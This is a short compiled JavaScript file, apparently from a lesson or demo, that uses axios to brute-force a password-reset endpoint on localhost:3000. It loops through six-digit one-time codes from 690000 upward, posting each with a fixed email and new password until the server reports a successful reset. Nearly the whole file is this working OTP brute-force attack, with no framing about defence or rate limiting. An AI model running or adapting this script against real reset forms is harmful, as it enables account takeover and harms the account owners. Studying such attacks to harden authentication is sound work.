"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            for (let i = 690000; i < 1000000; i++) {
                console.log("i is " + i);
                const result = yield axios_1.default.post("http://localhost:3000/reset-password", {
                    email: "hacker@gmail.com",
                    newPassword: "random",
                    otp: i.toString(),
                });
                console.log(result.data);
                if (result.data.msg === "Password reset successfully")
                    break;
            }
        }
        catch (e) {
            console.log(e.data);
        }
    });
}
main();
